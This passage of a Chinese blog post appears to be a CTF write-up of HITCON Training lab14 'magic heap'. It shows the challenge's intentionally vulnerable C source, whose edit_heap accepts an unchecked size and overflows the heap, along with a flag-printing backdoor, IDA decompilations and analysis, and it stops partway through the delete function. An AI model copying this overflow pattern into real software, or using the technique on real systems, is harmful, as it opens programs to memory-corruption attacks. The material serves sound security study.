<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>HITCON Training lab14 magic heap | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>HITCON Training lab14 magic heap</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-09-15T04:58:29.000Z" id="date"> 2023-09-15</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-13T15:02:03.029Z" id="updated"> 2023-09-13</time></div></span><br><span>Word Count: <div class="control">1.2k</div></span><br><span>Read Time: <div class="control">6 min</div></span></div></div><hr><div id="post-content"><h1 id="unsortedbin-attack（例题）"><a href="#unsortedbin-attack（例题）" class="headerlink" title="unsortedbin_attack（例题）"></a><strong>unsortedbin_attack（例题）</strong></h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><p class='item-img' data-src='https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png'><img src="https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png" alt="Snipaste_2023-09-13_21-07-19.png"></p>
<p>文件没开PIE，got表可写，开启了Canary和NX保护，64位程序。</p>
<h2 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_input</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size)</span> {<br>  <span class="hljs-type">int</span> ret;<br>  ret = read(<span class="hljs-number">0</span>, buf, size);<br>  <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);<br>    _exit(<span class="hljs-number">-1</span>);<br>  }<br>}<br><br><span class="hljs-type">char</span> *heaparray[<span class="hljs-number">10</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> magic = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">size_t</span> size = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {<br>    <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    size = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[idx], size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">free</span>(heaparray[idx]);<br>    heaparray[idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span> { system(<span class="hljs-string">"cat ./flag"</span>); }<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">switch</span> (atoi(buf)) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      create_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      edit_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      delete_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4869</span>:<br>      <span class="hljs-keyword">if</span> (magic &gt; <span class="hljs-number">4869</span>) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>        l33t();<br>      } <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h2><h3 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      menu();<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      v3 = atoi(buf);<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      delete_heap();<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">3</span> )<br>    {<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4869</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)magic &lt;= <span class="hljs-number">4869</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>        }<br>        <span class="hljs-keyword">else</span><br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>          l33t();<br>        }<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>LABEL_17:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      }<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>    {<br>      create_heap();<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      edit_heap();<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>看一看就行，接下来看具体函数功能</p>
<h3 id="l33t-存在后门函数"><a href="#l33t-存在后门函数" class="headerlink" title="l33t 存在后门函数"></a>l33t 存在后门函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"cat /home/magicheap/flag"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020B</span>9                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020</span>C0                 public magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; __int64 magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 magic           dq ?                    ; DATA XREF: main:loc_400D05↑r<br>.bss:<span class="hljs-number">00000000006020</span>C8                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020E0</span>                 public heaparray<br>.bss:<span class="hljs-number">00000000006020E0</span> ; heap *heaparray[<span class="hljs-number">10</span>]<br>.bss:<span class="hljs-number">00000000006020E0</span> heaparray       dq ?                    ; DATA XREF: create_heap+<span class="hljs-number">30</span>↑r<br>.bss:<span class="hljs-number">00000000006020E0</span>                                         ; create_heap+<span class="hljs-number">8</span>C↑w ...<br></code></pre></td></tr></tbody></table></figure>

<p>magic ：00000000006020C0</p>
<p>heap_ptr ：00000000006020E0</p>
<h3 id="meau函数"><a href="#meau函数" class="headerlink" title="meau函数"></a>meau函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>打印菜单</p>
<h3 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (heap *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>      {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>输入大小，创建相应大小的堆</p>
<h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v2 = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[v1], v2);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure>

<p>重新输入大小，更新内容，大小由我们定，存在堆溢出哦！！！</p>
<h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, 